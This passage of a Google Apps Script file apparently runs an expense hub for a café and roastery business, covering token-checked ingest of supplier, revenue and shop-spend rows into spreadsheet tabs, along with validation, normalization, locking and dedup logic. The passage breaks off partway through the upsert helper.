/**
 * Code.gs — LEIBLE Expense Hub core.
 *
 * doPost ingest endpoint + normalization + dedup + Sheet helpers, shared by
 * every connector. Tabs (see docs/schema.md):
 *   Suppliers : date | supplier | total | invoice_ref | location | source | extracted_at | department
 *   Sales     : date | location | gross_sales | source | extracted_at | department
 *   Labour    : week_start | week_end | location | total | iso_week | pulled_at | department
 *   Revenue   : date | department | channel | customer | amount | order_ref | source | extracted_at
 *   Summary   : week_start | week_end | supplier | location | total | summarized_at | department | kind
 *
 * `department` was appended LAST on every pre-existing tab so index-based
 * dedup keys (SUPPLIERS_KEY_COLS etc.) stay valid — see the plan's "why
 * department goes last" note. Existing rows backfill to DEFAULT_DEPARTMENT.
 *
 * Pure logic (normalizeSupplierRow / ingestSupplierRows / validateIngest_ /
 * appendNewRows_) is exercised by connectors/gas/test_code.js under a Node mock
 * of SpreadsheetApp — keep these functions free of editor-only globals.
 */

var SUPPLIERS_TAB = 'Suppliers';
var SALES_TAB = 'Sales';
var STAGING_TAB = '_staging';
var SUMMARY_TAB = 'Summary';
var ARCHIVE_TAB = '_archive';
var LABOUR_TAB = 'Labour';
var REVENUE_TAB = 'Revenue';

var SUMMARY_HEADERS = ['week_start', 'week_end', 'supplier', 'location', 'total', 'summarized_at', 'department', 'kind'];
var LABOUR_HEADERS = ['week_start', 'week_end', 'location', 'total', 'iso_week', 'pulled_at', 'department'];
var REVENUE_HEADERS = ['date', 'department', 'channel', 'customer', 'amount', 'order_ref', 'source', 'extracted_at'];

var ARCHIVE_RETENTION_DAYS = 183;

var SUPPLIERS_HEADERS = ['date', 'supplier', 'total', 'invoice_ref', 'location', 'source', 'extracted_at', 'department'];
var SALES_HEADERS = ['date', 'location', 'gross_sales', 'source', 'extracted_at', 'department'];

var DEFAULT_DEPARTMENT = 'Cafe';
var DEPARTMENTS = ['Cafe', 'Roastery'];

var SHOPSPEND_TAB = 'ShopSpend';
var SHOPSPEND_PULLS_TAB = 'ShopSpendPulls';
var SHOPSPEND_REPORT_TAB = 'ShopSpend Report';

var SHOPSPEND_HEADERS = ['shop_id', 'week_label', 'week_start', 'week_end', 'order_count',
  'amended_count', 'total_ex_gst', 'gst', 'total_inc_gst', 'gst_treatment', 'environment',
  'fetched_at', 'source', 'presence'];

var SHOPSPEND_PULLS_HEADERS = ['fetched_at', 'environment', 'from_week', 'to_week', 'matched',
  'returned', 'truncated', 'warnings_count', 'warnings', 'unpriced_sku_count', 'unpriced_skus',
  'amended_count', 'possible_duplicate_shop_names', 'empty_range_with_invalid_labels',
  'invalid_week_labels', 'gst_treatment', 'diverges_from_live_pricing', 'matches_live_pricing',
  'total_orders_scanned', 'absent_shop_ids', 'diagnostics_json'];

// Change-detection key into a normalized ShopSpend row array: shop_id + week_label.
// NOT an upsert key — ShopSpend is append-only (see step 3).
var SHOPSPEND_KEY_COLS = [0, 1];

// Dedup column indexes into a normalized row array.
var SUPPLIERS_KEY_COLS = [5, 3]; // source + invoice_ref
var SALES_KEY_COLS = [0, 1];     // date + location
var REVENUE_KEY_COLS = [6, 5];   // source + order_ref

// Summary row shape: [week_start, week_end, supplier, location, total, summarized_at, department, kind]
var SUMMARY_KEY_COLS = [0, 6, 7, 2, 3]; // week_start||department||kind||supplier||location
var SUMMARY_TOTAL_COL = 4;
var SUMMARY_STAMP_COL = 5;
var SUMMARY_KIND_COL = 7;

// step9 FIX1: sentinel `kind` value for a healBackupWeek_ marker row that
// records "the true pre-heal baseline for this week was ZERO live rows" —
// distinct from every real kind ('spend'/'revenue') so restoreWeekFromHealBackup_
// can recognize it and restore to nothing instead of re-inserting the marker.
var SUMMARY_HEAL_EMPTY_MARKER_KIND_ = 'empty-baseline';

// Snapshot-once backup for the guarded Summary heal path (PRD-12). Same shape
// as SUMMARY_HEADERS plus a run_id tag, so a restore can tell which run wrote
// which snapshot and healEarliestBackupRows_ can resolve ties to the earliest.
var SUMMARY_HEAL_BACKUP_TAB = 'Summary_heal_backup';
var SUMMARY_HEAL_BACKUP_HEADERS = SUMMARY_HEADERS.concat(['run_id']);
// ONE named source of truth for "where run_id lives" in a backup row — used
// by both healEarliestBackupRows_ and restoreWeekFromHealBackup_ so the two
// can never independently drift the moment a column is added to
// SUMMARY_HEADERS (step8 FIX3).
var SUMMARY_BACKUP_RUNID_COL = SUMMARY_HEADERS.length;

// Kill switch (PRD-12): SUMMARY_HEAL_ENABLED (Script Property, default OFF)
// controls only how many weeks a scheduled run heals — off means 1 (today's
// single-week behaviour, now guarded), on means SUMMARY_HEAL_WEEKS_ (or the
// SUMMARY_HEAL_WEEKS Script Property override). The gates themselves
// (backup, SPLIT guard, duplicate refusal, correction alert) are ALWAYS
// active in both states — the switch never bypasses them.
var SUMMARY_HEAL_WEEKS_ = 4;

/* ------------------------------------------------------------------ *
 * PHASE FREEZE — LIFTED 2026-08-31. Kept as a live, one-line re-freeze
 * switch, not as history: flip this constant back to true and redeploy and
 * the whole write half hard-refuses again. Its refusal machinery is still
 * asserted by the test suite (test_code.js: withHealFrozen), so re-arming it
 * is a tested operation, not a hope.
 *
 * Why it was frozen (2026-08-26): the phase-end gate ran 6 rounds and never
 * approved, and `scripts/deploy.sh` pushes the WHOLE project (there is no
 * partial deploy), so in-source refusals — not the deploy scope — were what
 * made the shipped subset safe.
 *
 * Why it was lifted: the blocker the freeze existed to hide was
 * weeklySummarize's two incompatible return shapes (the multi-week shape
 * omitted `refused`, so greenBeanPull_'s `!sumRes.refused` completion test
 * read an all-refused run as success and drained the resum queue). That is
 * fixed — the multi-week shape is now a strict superset — along with the
 * three MINORs the gate left open. Note the window still does NOT widen on
 * its own: with SUMMARY_HEAL_ENABLED absent, summaryHealWindowSize_ returns
 * 1, exactly as it did while frozen. Unfreezing removes the clamp; an
 * operator still has to set the Script Property to widen anything.
 *
 * WAS FROZEN, now live (every one of them NEW in this phase, so the freeze
 * restored the exact pre-phase production behaviour rather than regressing
 * anything):
 *   - the MULTI-week heal window — SUMMARY_HEAL_ENABLED can no longer widen
 *     it past 1 (summaryHealWindowSize_). The single-week guarded write IS
 *     the pre-existing weeklySummarize and stays live.
 *   - restoreSummaryWeekFromBackup()  (summary_audit.gs)
 *   - runSummaryOrphanSweep()         (summary_audit.gs — the destructive
 *     apply half; the dry run is read-only and stays available)
 *
 * NOT frozen, all read-only: previewSummaryHeal, checkSummaryDrift,
 * auditSummaryDrift*, listSummaryHealBackups, runSummaryOrphanSweepDryRun.
 *
 * The gates sit on the ZERO-ARG, no-underscore operator entry points — the
 * only surface a deploy exposes (Run picker + triggers). The underscore
 * internals (restoreWeekFromHealBackup_) stay hand-callable from the editor
 * on purpose: that is the documented 3am escape hatch, and invoking it is a
 * deliberate act, not something a deploy can expose.
 *
 * A source constant, NOT a Script Property, deliberately: a property can be
 * flipped from the GAS UI with no review. To RE-freeze: set this true and
 * redeploy.
 * ------------------------------------------------------------------ */
var SUMMARY_HEAL_FROZEN_ = false;
var SUMMARY_HEAL_FROZEN_MSG_ = 'frozen: the summary-self-heal WRITE path is frozen ' +
  '(SUMMARY_HEAL_FROZEN_ in Code.gs has been set back to true). ' +
  'Read-only previewSummaryHeal() / checkSummaryDrift() / listSummaryHealBackups() ' +
  'remain available.';

/**
 * Suppliers whose Summary rows NO heal recompute can ever produce, so a heal
 * neither writes nor owns them:
 *   shopify_orderapp — online revenue written DIRECTLY by the order-app pull
 *     (orderapp.gs, PRD-10); no Suppliers/Revenue backing at all, and not
 *     rebuildable from this project's own data.
 *   labour — written by labourWeeklyPull_ from an EXTERNAL spreadsheet
 *     (LABOUR_SHEET_ID), never from Suppliers/Revenue.
 *
 * This is deliberately NOT summary_audit.gs's SUMMARY_AUDIT_PULL_OWNED_,
 * which is an audit-NOISE list: it also names greenbean/bennetts, whose rows
 * ARE derived from Suppliers and therefore ARE rebuildable by a heal. Using
 * that wider list as a write filter would wrongly exempt rows a heal owns.
 *
 * One named list, two consumers — healOrphanCandidates_'s exclusion and
 * restoreWeekFromHealBackup_'s delete predicate — so they cannot drift.
 * @param {Array} row a Summary-shaped row (supplier at index 2)
 */
var SUMMARY_HEAL_FOREIGN_SUPPLIERS_ = ['shopify_orderapp', 'labour'];
function summaryRowIsHealForeign_(row) {
  return SUMMARY_HEAL_FOREIGN_SUPPLIERS_.indexOf(mayersNorm_(String(row[2]))) !== -1;
}

// source → canonical supplier name. Ordermentum carries its name per-account in
// the row payload (row.supplier), so it is intentionally absent here.
var SUPPLIER_NAMES = {
  food_dairy_co: 'Food and Dairy Co',
  fresh_and_chill: 'Fresh and Chill',
  kent_paper: 'Kent Paper',
  mayers: 'Mayers'
};

/* ------------------------------------------------------------------ *
 * Concurrency — one lock mechanism, wrapped at entry points only
 *
 * LockService did not exist anywhere in this repo before this phase
 * (staleness.gs:73-79 documents a deliberate earlier decision to skip it —
 * that reasoning does not extend to a read-modify-write column rewrite, so
 * this is a considered departure, see docs/ADR.md).
 *
 * Every ingest path is scan-then-write (buildKeyIndex_/buildKeySet_ scan,
 * then append/update). Locking only the write half would let two concurrent
 * doPost executions each finish their scan before either writes, then both
 * append the same row — the code would look protected and not be. So the
 * lock wraps whole ENTRY POINTS (doPost, weeklySummarize,
 * migrateAddDepartment_, squareDailyPull), never the inner write helpers.
 *
 * A module-level depth counter makes accidental nesting harmless: Apps
 * Script's script lock is held per EXECUTION, so a nested tryLock would
 * succeed silently and an inner releaseLock() would drop the outer scope's
 * lock mid-batch with nothing to catch it. Depth>0 means "already held by
 * this execution" — just run the callback, no raw acquire/release.
 * ------------------------------------------------------------------ */

var SCRIPT_LOCK_DEPTH_ = 0;
var SCRIPT_LOCK_TIMEOUT_MS_ = 30000;
var LOCK_TIMEOUT_ = { lockTimeout: true }; // sentinel: withScriptLock_ could not acquire

function withScriptLock_(fn) {
  if (SCRIPT_LOCK_DEPTH_ > 0) {
    SCRIPT_LOCK_DEPTH_++;
    try { return fn(); }
    finally { SCRIPT_LOCK_DEPTH_--; }
  }

  var lock = LockService.getScriptLock();
  var acquired = lock.tryLock(SCRIPT_LOCK_TIMEOUT_MS_);
  if (!acquired) {
    Logger.log('withScriptLock_: could not acquire script lock within ' + SCRIPT_LOCK_TIMEOUT_MS_ + 'ms');
    return LOCK_TIMEOUT_;
  }

  SCRIPT_LOCK_DEPTH_ = 1;
  try {
    return fn();
  } finally {
    SCRIPT_LOCK_DEPTH_ = 0;
    lock.releaseLock();
  }
}

/* ------------------------------------------------------------------ *
 * Web-app entry point
 * ------------------------------------------------------------------ */

/**
 * doPost — receives an ingest payload from a Playwright connector or the
 * wholesale/Shopify sources (P2+).
 * Body: { kind?, source, rows:[...], extracted_at }
 * `kind` defaults to 'suppliers' (back-compat: existing connectors omit it).
 *   'suppliers' rows → Suppliers tab (dedup+upsert on source+invoice_ref)
 *   'revenue'   rows → Revenue tab   (dedup+upsert on source+order_ref)
 * @returns {ContentService.TextOutput} JSON { result, rowsAdded, rowsUpdated, duplicatesSkipped }
 */
function doPost(e) {
  try {
    var body = JSON.parse((e && e.postData && e.postData.contents) || '{}');

    // AUTH FIRST, for EVERY payload — before validateIngest_, before any
    // write. This deployment is access:ANYONE_ANONYMOUS and its /exec URL is
    // committed in config/deployment.json, so an unauthenticated doPost means
    // anyone holding that URL can write arbitrary rows into the financial
    // Sheet: inflate or zero any supplier's spend, claim another connector's
    // `source` and overwrite its real invoices in place, or swing the company
    // headline the external GM cost monitor reads every Monday 08:00.
    //
    // This REPLACES the narrower gate from phase dopost-auth-minors, which
    // covered only payloads carrying weeks_verified_empty. That scope was a
    // deliberate decision at the time; it was reopened on 2026-09-04 after a
    // security audit, by Jake, with the connector side updated in the same
    // change. Every poster must now send `token` (the API_READ_TOKEN value,
    // named GAS_READ_TOKEN on the connector side — same secret, different
    // name by long-standing convention).
    //
    // checkReadToken_ is fail-closed: an unset API_READ_TOKEN rejects every
    // request rather than opening the door.
    //
    // code:'UNAUTHORIZED' stays machine-readable, but it no longer means
    // "retry without the gated field" — there is no degraded mode left, and
    // the shopSpend poster was updated to stop trying one.
    var auth = checkReadToken_({ token: body && body.token });
    if (!auth.ok) return jsonOut_({ result: 'error', code: 'UNAUTHORIZED', message: 'unauthorized' });
    var check = validateIngest_(body);
    if (!check.ok) return jsonOut_({ result: 'error', message: check.message });

    var kind = body.kind || 'suppliers';

    var res = withScriptLock_(function () {
      var ss = getHubSpreadsheet_();
      if (kind === 'shopspend') {
        var tabs = ensureShopSpendTabs_(ss);
        // step2.md:48-51's snippet passes 5 args (no pulls sheet), but writing the
        // pull marker row to ShopSpendPulls requires a reference to that sheet —
        // tabs.pulls is added here for that reason.
        return ingestShopSpendRows(body.source, body.rows, body.extracted_at, tabs.data, tabs.pulls, body.pull,
          body.weeks_complete, body.weeks_verified_empty);
      }
      if (kind === 'revenue') {
        var revSheet = ensureSheet(ss, REVENUE_TAB, REVENUE_HEADERS);
        return ingestRevenueRows(body.source, body.rows, body.extracted_at, revSheet);
      }
      var suppSheet = ensureSheet(ss, SUPPLIERS_TAB, SUPPLIERS_HEADERS);
      return ingestSupplierRows(body.source, body.rows, body.extracted_at, suppSheet);
    });

    // Lock-timeout must be explicit, not silent — a connector POST arriving
    // while weeklySummarize holds the lock past its own timeout must not
    // vanish. The Playwright BaseConnector.post does NOT retry this; the
    // shopSpend poster (connectors/shopspend/ingest.py) retries once after 60s.
    if (res === LOCK_TIMEOUT_) {
      return jsonOut_({ result: 'error', code: 'LOCKED', retryable: true });
    }

    // Watchdog heartbeat: a run that reached here SUCCEEDED, even if dedup meant
    // it wrote nothing. Stamping regardless of rowsAdded is what stops the
    // staleness alert crying wolf on a quiet weekend. Never throws.
    stalenessStampHeartbeat_(body.source);

    var response = {
      result: 'ok',
      rowsAdded: res.rowsAdded,
      rowsUpdated: res.rowsUpdated,
      duplicatesSkipped: res.duplicatesSkipped
    };
    if (kind === 'shopspend') {
      response.tombstonesWritten = res.tombstonesWritten;
      response.tombstonesSkipped = res.tombstonesSkipped;
    }
    return jsonOut_(response);
  } catch (err) {
    return jsonOut_({ result: 'error', message: String((err && err.message) || err) });
  }
}

/* ------------------------------------------------------------------ *
 * Validation + normalization (pure, unit-tested)
 * ------------------------------------------------------------------ */

/**
 * True iff `v` is an array whose every element is a well-formed ISO week
 * label ('YYYY-Www', always 2-digit week). Used to validate weeks_complete /
 * weeks_verified_empty — a JSON string or a nested array must be rejected,
 * not silently coerced.
 */
function isValidWeekLabel_(s) {
  if (typeof s !== 'string' || !/^\d{4}-W\d{2}$/.test(s)) return false;
  // Bound 01-53: no ISO year has a W00 or a W54+. A flat 53 accepts W53 in
  // 52-week years — a cheap sanity bound, not a calendar computation.
  var week = parseInt(s.slice(-2), 10);
  return week >= 1 && week <= 53;
}

function isValidWeekLabelArray_(v) {
  if (!Array.isArray(v)) return false;
  for (var i = 0; i < v.length; i++) {
    if (!isValidWeekLabel_(v[i])) return false;
  }
  return true;
}

/**
 * Validate an ingest payload. Returns { ok:boolean, message?:string }.
 * `kind` (default 'suppliers') selects which per-row shape is enforced.
 * A `department` present on any row must be one of DEPARTMENTS — a typo'd
 * department would otherwise create a phantom third department no report
 * ever shows.
 */
function validateIngest_(body) {
  if (!body || typeof body !== 'object') return { ok: false, message: 'body is not an object' };
  if (!body.source || typeof body.source !== 'string') return { ok: false, message: 'missing source' };
  if (!Array.isArray(body.rows)) return { ok: false, message: 'missing rows array' };
  if (!body.extracted_at) return { ok: false, message: 'missing extracted_at' };

  var kind = body.kind || 'suppliers';
  if (kind !== 'suppliers' && kind !== 'revenue' && kind !== 'shopspend') {
    return { ok: false, message: 'unknown kind: ' + kind };
  }

  // Stock-intake invoices for Roastery arrive ONLY via the Order-app
  // greenBeanCost pull (source='greenbean') — coffee_order_app never had a
  // production suppliers-kind writer, and the reserved payload shape in
  // docs/ingest-contract.md is now superseded/rejected, not just unused.
  if (kind === 'suppliers' && String(body.source).trim().toLowerCase() === 'coffee_order_app') {
    return {
      ok: false,
      message: 'coffee_order_app suppliers payloads are rejected: stock-intake invoices ' +
        'for Roastery arrive only via the Order-app greenBeanCost pull (source=\'greenbean\')'
    };
  }

  // The other half of the same exclusivity (PRD-10): online revenue's ONLY
  // sanctioned producer is the Order-app shopifySales pull, which writes
  // Summary directly. A connector POSTing kind='revenue' rows with
  // channel='online' would flow through weeklySummarize into a second
  // source-keyed online Summary row and double-count the week.
  if (kind === 'revenue') {
    for (var oc = 0; oc < body.rows.length; oc++) {
      var rowChannel = body.rows[oc] && body.rows[oc].channel;
      if (String(rowChannel).trim().toLowerCase() === 'online') {
        return {
          ok: false,
          message: 'online-channel revenue rows are rejected: Shopify online revenue arrives ' +
            'only via the Order-app shopifySales pull (supplier=\'shopify_orderapp\' Summary rows, PRD-10)'
        };
      }
    }
  }

  if (body.weeks_complete !== undefined && !isValidWeekLabelArray_(body.weeks_complete)) {
    return { ok: false, message: 'invalid weeks_complete' };
  }

  var weeksVerifiedEmptySet_ = {};
  if (body.weeks_verified_empty !== undefined) {
    if (!isValidWeekLabelArray_(body.weeks_verified_empty)) {
      return { ok: false, message: 'invalid weeks_verified_empty' };
    }
    var weeksCompleteSet_ = {};
    var weeksCompleteArr_ = Array.isArray(body.weeks_complete) ? body.weeks_complete : [];
    for (var wc = 0; wc < weeksCompleteArr_.length; wc++) weeksCompleteSet_[weeksCompleteArr_[wc]] = true;
    for (var ve = 0; ve < body.weeks_verified_empty.length; ve++) {
      var veWeek = body.weeks_verified_empty[ve];
      if (!weeksCompleteSet_[veWeek]) {
        return { ok: false, message: 'weeks_verified_empty entry not in weeks_complete: ' + veWeek };
      }
      weeksVerifiedEmptySet_[veWeek] = true;
    }
  }

  for (var i = 0; i < body.rows.length; i++) {
    var r = body.rows[i];
    if (!r || typeof r !== 'object') return { ok: false, message: 'row ' + i + ' is not an object' };
    if (!r.date) return { ok: false, message: 'row ' + i + ' missing date' };

    if (r.department !== undefined && r.department !== null && r.department !== '' &&
        DEPARTMENTS.indexOf(String(r.department)) === -1) {
      return { ok: false, message: 'row ' + i + ' invalid department: ' + r.department };
    }

    if (kind === 'shopspend') {
      if (!r.shop_id) return { ok: false, message: 'row ' + i + ' missing shop_id' };
      if (!r.week_label || !isValidWeekLabel_(String(r.week_label))) {
        return { ok: false, message: 'row ' + i + ' invalid week_label' };
      }
      if (weeksVerifiedEmptySet_[r.week_label]) {
        return { ok: false, message: 'row ' + i + ' has week_label ' + r.week_label + ' but that week is in weeks_verified_empty' };
      }
      if (!r.week_start) return { ok: false, message: 'row ' + i + ' missing week_start' };
      if (!r.week_end) return { ok: false, message: 'row ' + i + ' missing week_end' };
      if (r.total_ex_gst === undefined || r.total_ex_gst === null || isNaN(Number(r.total_ex_gst))) {
        return { ok: false, message: 'row ' + i + ' missing/invalid total_ex_gst' };
      }
      if (r.gst === undefined || r.gst === null || isNaN(Number(r.gst))) {
        return { ok: false, message: 'row ' + i + ' missing/invalid gst' };
      }
      if (r.total_inc_gst === undefined || r.total_inc_gst === null || isNaN(Number(r.total_inc_gst))) {
        return { ok: false, message: 'row ' + i + ' missing/invalid total_inc_gst' };
      }
      if (r.order_count === undefined || r.order_count === null || isNaN(Number(r.order_count))) {
        return { ok: false, message: 'row ' + i + ' missing/invalid order_count' };
      }
      if (r.amended_count === undefined || r.amended_count === null || isNaN(Number(r.amended_count))) {
        return { ok: false, message: 'row ' + i + ' missing/invalid amended_count' };
      }
    } else if (kind === 'revenue') {
      if (r.amount === undefined || r.amount === null || isNaN(Number(r.amount))) {
        return { ok: false, message: 'row ' + i + ' missing/invalid amount' };
      }
      if (!r.order_ref) return { ok: false, message: 'row ' + i + ' missing order_ref' };
      if (!r.channel) return { ok: false, message: 'row ' + i + ' missing channel' };
      if (!r.customer) return { ok: false, message: 'row ' + i + ' missing customer' };
    } else {
      if (r.total === undefined || r.total === null || isNaN(Number(r.total))) {
        return { ok: false, message: 'row ' + i + ' missing/invalid total' };
      }
      if (!r.invoice_ref) return { ok: false, message: 'row ' + i + ' missing invoice_ref' };
    }
  }
  return { ok: true };
}

/**
 * Resolve the canonical supplier name. Per-row `supplier` (Ordermentum) wins;
 * otherwise fall back to the SUPPLIER_NAMES map, then the raw source.
 */
function canonicalSupplier_(source, row) {
  if (row && row.supplier) return String(row.supplier);
  return SUPPLIER_NAMES[source] || source;
}

/**
 * Map a raw supplier row to the Suppliers column order.
 * @returns {Array} [date, supplier, total, invoice_ref, location, source, extracted_at, department]
 */
function normalizeSupplierRow(row, source, extractedAt) {
  return [
    String(row.date),
    canonicalSupplier_(source, row),
    Number(row.total),
    String(row.invoice_ref),
    row.location ? String(row.location) : '',
    source,
    extractedAt,
    row.department ? String(row.department) : DEFAULT_DEPARTMENT
  ];
}

/**
 * Map a raw revenue row to the Revenue column order.
 * @returns {Array} [date, department, channel, customer, amount, order_ref, source, extracted_at]
 */
function normalizeRevenueRow(row, source, extractedAt) {
  return [
    String(row.date),
    row.department ? String(row.department) : DEFAULT_DEPARTMENT,
    String(row.channel),
    String(row.customer),
    Number(row.amount),
    String(row.order_ref),
    source,
    extractedAt
  ];
}

/**
 * Map [dateStr, location, gross, source, extractedAt] → the Sales column
 * order INCLUDING department. square.gs used to build this as a bare
 * literal, which meant every post-migration row landed with a blank
 * department while backfilled history read 'Cafe' — permanently splitting
 * the Sales tab. Route every writer through this normalizer instead.
 * @returns {Array} [date, location, gross_sales, source, extracted_at, department]
 */
function normalizeSalesRow_(dateStr, location, gross, source, extractedAt, department) {
  return [
    String(dateStr),
    String(location),
    Number(gross),
    source,
    extractedAt,
    department ? String(department) : DEFAULT_DEPARTMENT
  ];
}

/**
 * Map a raw shopspend row to the ShopSpend column order.
 * Per-row fetched_at (if present) overrides extracted_at; presence defaults to 'present'.
 * @returns {Array} [shop_id, week_label, week_start, week_end, order_count, amended_count, total_ex_gst, gst, total_inc_gst, gst_treatment, environment, fetched_at, source, presence]
 */
function normalizeShopSpendRow(row, source, extractedAt) {
  return [
    String(row.shop_id),
    String(row.week_label),
    String(row.week_start),
    String(row.week_end),
    Number(row.order_count),
    Number(row.amended_count),
    Number(row.total_ex_gst),
    Number(row.gst),
    Number(row.total_inc_gst),
    row.gst_treatment ? String(row.gst_treatment) : '',
    row.environment ? String(row.environment) : '',
    row.fetched_at ? String(row.fetched_at) : extractedAt,
    source,
    'present'
  ];
}

/**
 * Map a pull metadata object to the ShopSpendPulls column order.
 * @returns {Array} [fetched_at, environment, from_week, to_week, matched, returned, truncated, warnings_count, warnings, unpriced_sku_count, unpriced_skus, amended_count, possible_duplicate_shop_names, empty_range_with_invalid_labels, invalid_week_labels, gst_treatment, diverges_from_live_pricing, matches_live_pricing, total_orders_scanned, absent_shop_ids, diagnostics_json]
 */
function normalizePullMetadataRow_(pull) {
  return [
    String(pull.fetched_at),
    String(pull.environment),
    String(pull.from_week),
    String(pull.to_week),
    Number(pull.matched),
    Number(pull.returned),
    pull.truncated,
    Number(pull.warnings_count),
    String(pull.warnings),
    Number(pull.unpriced_sku_count),
    String(pull.unpriced_skus),
    Number(pull.amended_count),
    String(pull.possible_duplicate_shop_names),
    pull.empty_range_with_invalid_labels,
    String(pull.invalid_week_labels),
    String(pull.gst_treatment),
    pull.diverges_from_live_pricing,
    pull.matches_live_pricing,
    Number(pull.total_orders_scanned),
    String(pull.absent_shop_ids),
    String(pull.diagnostics_json)
  ];
}

/* ------------------------------------------------------------------ *
 * Ingest + dedup
 * ------------------------------------------------------------------ */

/**
 * Normalize + upsert a batch of supplier rows into a sheet.
 * Dedup/upsert is against existing sheet rows AND earlier rows in the same
 * batch — see upsertRows_.
 * @returns {{rowsAdded:number, rowsUpdated:number, duplicatesSkipped:number}}
 */
/**
 * The dedup keys of every invoice that has been purged to `_archive`.
 *
 * upsertRows_ can only see the tab it is writing to, so an invoice that
 * archiveAndPurge_ moved out of `Suppliers` reads as BRAND NEW on the next
 * ingest and gets appended again — the same invoice_ref now living in both
 * tabs. That is not theoretical: the 2026-08-25 Ordermentum backfill put 24
 * weeks into exactly that state.
 *
 * It matters because every consumer that reconstructs history reads
 * Suppliers + _archive together, so a duplicated invoice is counted twice.
 *
 * @returns {Object} { 'source||invoice_ref': true }
 */
function supplierArchiveKeySet_() {
  var ss = getHubSpreadsheet_();
  var archSheet = ss.getSheetByName(ARCHIVE_TAB);
  if (!archSheet) return {};
  return buildKeySet_(archSheet, SUPPLIERS_KEY_COLS);
}

function ingestSupplierRows(source, rows, extractedAt, sheet) {
  var normalizedRows = [];
  for (var i = 0; i < rows.length; i++) {
    normalizedRows.push(normalizeSupplierRow(rows[i], source, extractedAt));
  }

  /* Drop anything already sitting in `_archive` BEFORE the upsert. Skipping
   * rather than updating is deliberate: `_archive` is historical, a write
   * there would not reach Summary anyway, and re-appending to Suppliers is the
   * defect being fixed. The count is returned and logged so a supplier
   * genuinely re-issuing old invoices is visible rather than silently ignored. */
  var archivedKeys = supplierArchiveKeySet_();
  var fresh = [];
  var archivedSkipped = 0;
  for (var j = 0; j < normalizedRows.length; j++) {
    if (archivedKeys[rowKey_(normalizedRows[j], SUPPLIERS_KEY_COLS)] === true) {
      archivedSkipped++;
      continue;
    }
    fresh.push(normalizedRows[j]);
  }

  // amountCol=2 (total), stampCol=6 (extracted_at) — department (col 7) is
  // never touched by an upsert; only the invoice's own amount/date can change.
  var res = upsertRows_(sheet, fresh, SUPPLIERS_KEY_COLS, 2, 6);
  res.archivedSkipped = archivedSkipped;
  if (archivedSkipped > 0) {
    Logger.log('ingestSupplierRows: ' + archivedSkipped + ' row(s) already in ' +
      ARCHIVE_TAB + ' — not re-appended to ' + SUPPLIERS_TAB);
  }
  return res;
}

/**
 * Normalize + upsert a batch of revenue rows into the Revenue tab.
 * @returns {{rowsAdded:number, rowsUpdated:number, duplicatesSkipped:number}}
 */
function ingestRevenueRows(source, rows, extractedAt, sheet) {
  var normalizedRows = [];
  for (var i = 0; i < rows.length; i++) {
    normalizedRows.push(normalizeRevenueRow(rows[i], source, extractedAt));
  }
  // amountCol=4 (amount), stampCol=7 (extracted_at)
  return upsertRows_(sheet, normalizedRows, REVENUE_KEY_COLS, 4, 7);
}

/**
 * Append/update a single normalized Sales row.
 * Blanket upsert on Sales is unsafe: SALES_KEY_COLS is date+location, so a
 * mid-day squareDailyPull re-run must never overwrite a completed day's
 * gross with a partial figure. Only a PRIOR day (not today, Sydney time) may
 * be corrected in place; same-day re-runs always skip, matching the old
 * dedup-only behaviour.
 * @returns {{appended:boolean, updated:boolean}}
 */
function appendSalesRow_(sheet, normalizedRow) {
  var idx = buildKeyIndex_(sheet, SALES_KEY_COLS);
  var key = rowKey_(normalizedRow, SALES_KEY_COLS);
  var existingRowNum = idx[key];

  if (existingRowNum === undefined) {
    appendNewRows_(sheet, [normalizedRow]);
    return { appended: true, updated: false };
  }

  var rowDate = coerceDateStr_(normalizedRow[0]);
  if (rowDate === todayStr_()) {
    // Today's partial figure must never overwrite today's row.
    return { appended: false, updated: false };
  }

  sheet.getRange(existingRowNum, 3).setValue(normalizedRow[2]); // gross_sales (col C)
  sheet.getRange(existingRowNum, 5).setValue(normalizedRow[4]); // extracted_at (col E)
  return { appended: false, updated: true };
}

/**
 * Build a lookup of existing dedup keys → 1-based sheet row number
 * (skips the header row = row 1).
 * @returns {Object} { key: sheetRowNumber }
 */
function buildKeyIndex_(sheet, keyCols) {
  var idx = {};
  var values = sheet.getDataRange().getValues();
  for (var r = 1; r < values.length; r++) { // row 0 = header
    idx[rowKey_(values[r], keyCols)] = r + 1;
  }
  return idx;
}

/**
 * Thin wrapper over buildKeyIndex_ for callers that only need membership.
 * @returns {Object} { key: true }
 */
function buildKeySet_(sheet, keyCols) {
  var idx = buildKeyIndex_(sheet, keyCols);
  var set = {};
  for (var k in idx) {
    if (Object.prototype.hasOwnProperty.call(idx, k)) set[k] = true;
  }
  return set;
}

/**
 * Upsert a batch of already-normalized rows into a sheet.
 * - New key (not on the sheet, not yet seen in this batch) → append.
 * - Existing sheet key, amount unchanged → duplicatesSkipped++, no write.
 * - Existing sheet key, amount changed → update amountCol + stampCol in
 *   place (getRange().setValue()), rowsUpdated++.
 * - A key repeated within the same batch (after being resolved once) →
 *   duplicatesSkipped++, matching the old within-batch dedup behaviour.
 * `updates` records only rows actually rewritten (amount genuinely changed) —
 * a new row or an unchanged-amount duplicate never appears in it. This is
 * what the correction alert (PRD-12) is driven from.
 * @returns {{rowsAdded:number, rowsUpdated:number, duplicatesSkipped:number, updates:Array<{key:string,from:number,to:number}>}}
 */
function upsertRows_(sheet, normalizedRows, keyCols, amountCol, stampCol) {
  var values = sheet.getDataRange().getValues();
  var idx = {}; // key -> 1-based sheet row number, existing rows only
  for (var r = 1; r < values.length; r++) {
    idx[rowKey_(values[r], keyCols)] = r + 1;
  }

  var seenInBatch = {};
  var toAppend = [];
  var rowsUpdated = 0, duplicatesSkipped = 0;
  var updates = [];

  for (var i = 0; i < normalizedRows.length; i++) {
    var row = normalizedRows[i];
    var key = rowKey_(row, keyCols);

    if (seenInBatch[key]) { duplicatesSkipped++; continue; }

    var existingRowNum = idx[key];
    if (existingRowNum === undefined) {
      seenInBatch[key] = true;
      toAppend.push(row);
      continue;
    }

    seenInBatch[key] = true;
    var existingAmount = Number(values[existingRowNum - 1][amountCol]);
    var newAmount = Number(row[amountCol]);

    if (existingAmount === newAmount) { duplicatesSkipped++; continue; }

    sheet.getRange(existingRowNum, amountCol + 1).setValue(newAmount);
    if (stampCol !== undefined && stampCol !== null) {
      sheet.getRange(existingRowNum, stampCol + 1).setValue(row[stampCol]);
    }
    rowsUpdated++;
    updates.push({ key: key, from: existingAmount, to: newAmount });
  }

  if (toAppend.length) appendNewRows_(sheet, toAppend);

